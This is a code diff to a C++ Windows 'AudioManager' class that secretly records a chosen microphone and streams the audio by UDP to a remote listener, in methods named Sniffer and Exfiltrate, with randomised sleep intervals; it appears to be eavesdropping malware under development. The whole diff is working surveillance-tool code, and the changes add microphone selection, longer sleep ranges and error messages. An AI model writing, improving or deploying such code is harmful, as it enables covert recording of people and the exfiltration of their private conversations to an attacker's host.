@@ -4,17 +4,98 @@ void AudioManager::SetSleepMode(int modeInt) {
     // 1. Convert the int to our Enum
     SleepProfile profile = static_cast<SleepProfile>(modeInt);
     
-    float min = 1;
-    float max = 6;
+    float min = 5.0f;
+    float max = 10.0f;
 
     switch (modeInt) {
         case 0: min = 5.0f;  max = 10.0f; break; 
         case 1: min = 10.0f; max = 20.0f; break;
         case 2: min = 20.0f; max = 40.0f; break; 
         case 3: min = 40.0f; max = 80.0f; break;
-        case 4: min = 1.0f;  max = 80.0f; break;
+        case 4: min = 5.0f;  max = 300.0f; break;
     }
     this->dist = std::uniform_real_distribution<float>{ min, max };
+}
+
+std::vector<std::wstring> AudioManager::GetMicrophones() {
+    std::vector<std::wstring> microphones;
+
+    IMMDeviceEnumerator* pLocalEnumerator = NULL;
+    HRESULT hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pLocalEnumerator);
+
+    if (SUCCEEDED(hr)) {
+        IMMDeviceCollection* pCollection = NULL;
+        hr = pLocalEnumerator->EnumAudioEndpoints(eCapture, DEVICE_STATE_ACTIVE, &pCollection);
+
+        if (SUCCEEDED(hr)) {
+            UINT count;
+            pCollection->GetCount(&count);
+
+            for (UINT i = 0; i < count; i++) {
+                IMMDevice* pEndpoint = NULL;
+                pCollection->Item(i, &pEndpoint);
+
+                IPropertyStore* pProps = NULL;
+                pEndpoint->OpenPropertyStore(STGM_READ, &pProps);
+
+                PROPVARIANT varName;
+                PropVariantInit(&varName);
+
+                if (SUCCEEDED(pProps->GetValue(PKEY_Device_FriendlyName, &varName))) {
+                    if (varName.pwszVal != nullptr) {
+                        // Directly push the wide string
+                        microphones.push_back(std::wstring(varName.pwszVal));
+                    }
+                }
+
+                PropVariantClear(&varName);
+                pProps->Release();
+                pEndpoint->Release();
+            }
+            pCollection->Release();
+        }
+        pLocalEnumerator->Release();
+    }
+    return microphones;
+}
+
+void AudioManager::ListMicrophones() {
+    int i = 1;
+    for (const std::wstring& microphone : GetMicrophones()) {
+        std::wcout << i << L". " << microphone << std::endl;
+        i++;
+    }
+}
+
+void AudioManager::SelectMicrophoneFromInt(int micIndex) {
+    if (!pEnumerator) {
+        (void)CoInitialize(NULL);
+        HRESULT hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
+        if (FAILED(hr)) {
+            std::cerr << "[-] Failed to create instance of device enumerator" << std::endl;
+            return;
+        }
+    }
+
+    IMMDeviceCollection* pCollection = NULL;
+    HRESULT hr = pEnumerator->EnumAudioEndpoints(eCapture, DEVICE_STATE_ACTIVE, &pCollection);
+
+    if (SUCCEEDED(hr)) {
+        IMMDevice* pEndpoint = NULL;
+        // We use micIndex (the argument name) here
+        if (SUCCEEDED(pCollection->Item(micIndex - 1, &pEndpoint))) {
+            LPWSTR pwszID = NULL;
+            if (SUCCEEDED(pEndpoint->GetId(&pwszID))) {
+                this->targetDeviceId = pwszID; // Save to the class member
+                CoTaskMemFree(pwszID);
+            }
+            pEndpoint->Release();
+        }
+        else {
+            std::cerr << "[-] Failed to fetch microphone from index: " << micIndex << " using default microphone." << std::endl;
+        }
+        pCollection->Release();
+    }
 }
 
 void AudioManager::RandomSleep() {
@@ -38,6 +119,7 @@ void AudioManager::SetListener(std::string ip_address, int port) {
     udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (udpSocket == INVALID_SOCKET) {
         WSACleanup();
+        std::cerr << "[-] Failed to create socket object!" << std::endl;
         return;
     }
 
@@ -47,22 +129,25 @@ void AudioManager::SetListener(std::string ip_address, int port) {
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(static_cast<u_short>(port));
     if (inet_pton(AF_INET, ip_address.c_str(), &serverAddr.sin_addr) != 1) {
-        std::cerr << "Bad IP: " << ip_address << "\n";
+        std::cerr << "[-] Bad IP: " << ip_address << "\n";
         return;
     }
     socketInitialized = true;
 }
 
-
 bool AudioManager::Initialize() {
     HRESULT hr;
-    CoInitialize(NULL);
+    hr = CoInitialize(NULL);
 
     hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
     if (FAILED(hr)) return false;
 
-    hr = pEnumerator->GetDefaultAudioEndpoint(eCapture, eConsole, &pDevice);
-    if (FAILED(hr)) return false;
+    if (targetDeviceId.empty()) {
+        hr = pEnumerator->GetDefaultAudioEndpoint(eCapture, eConsole, &pDevice);
+    }
+    else {
+        hr = pEnumerator->GetDevice(targetDeviceId.c_str(), &pDevice);
+    }
 
     hr = pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
     if (FAILED(hr)) return false;
@@ -75,8 +160,8 @@ bool AudioManager::Initialize() {
     targetFormat.wFormatTag = WAVE_FORMAT_PCM;
     targetFormat.nChannels = 1;
     targetFormat.nSamplesPerSec = 16000;
-    targetFormat.wBitsPerSample = 16;      // <--- ADD THIS
-    targetFormat.nBlockAlign = 2;          // <--- ADD THIS (Channels * Bits/8)
+    targetFormat.wBitsPerSample = 16;     
+    targetFormat.nBlockAlign = 2;         
     targetFormat.nAvgBytesPerSec = targetFormat.nSamplesPerSec * targetFormat.nBlockAlign;
     targetFormat.cbSize = 0;
 
@@ -96,11 +181,14 @@ bool AudioManager::Initialize() {
         hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, 0, 10000000, 0, pwfx, NULL);
     }
     else {
-        // Update your global pwfx pointer to match what we actually initialized
-        // This ensures your Sniffer loop knows the correct channel count
         if (pwfx) CoTaskMemFree(pwfx); // Clean up old memory if it exists
         pwfx = (WAVEFORMATEX*)CoTaskMemAlloc(sizeof(WAVEFORMATEX));
-        memcpy(pwfx, &targetFormat, sizeof(WAVEFORMATEX));
+        if (pwfx != 0) {
+            memcpy(pwfx, &targetFormat, sizeof(WAVEFORMATEX));
+        }
+        else {
+            std::cerr << "Failed to initialize Audio Mix Format" << std::endl;
+        }
     }
 
     hr = pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pCaptureClient);
@@ -167,7 +255,6 @@ void AudioManager::Exfiltrate() {
     auto nextFlush = clock::now();
     const auto flushEvery = std::chrono::seconds(5);
 
-    // Optimized packet size for Ethernet (MTU 1500 - IP/UDP headers)
     const size_t CHUNK_SIZE = 1440;
 
     while (bRunning) {
@@ -182,8 +269,6 @@ void AudioManager::Exfiltrate() {
         {
             std::unique_lock<std::mutex> lock(bufferMutex);
 
-            // Wait until we have a substantial amount of data to make 
-            // the network overhead worth it (e.g., at least 10KB)
             if (globalAudioBuffer.size() < 10240 && bRunning) {
                 lock.unlock();
                 std::this_thread::sleep_for(std::chrono::milliseconds(200));
@@ -239,10 +324,8 @@ void AudioManager::Exfiltrate() {
 
 void AudioManager::Stop() {
     bRunning = false;
-
     if (sniffer.joinable()) sniffer.join();
     if (exfilThread.joinable()) exfilThread.join();
-
     Release();
 }
 
@@ -250,6 +333,13 @@ void AudioManager::Start() {
     if (!bRunning) {
         bRunning = true;
     }
+
+    if (!socketInitialized) {
+        std::cerr << "[-] Failed to connect to listener!" << std::endl;
+        return;
+    }
+    
+
     LaunchSnifferThread();
     exfilThread = std::thread(&AudioManager::Exfiltrate, this);
     exfilThread.join();
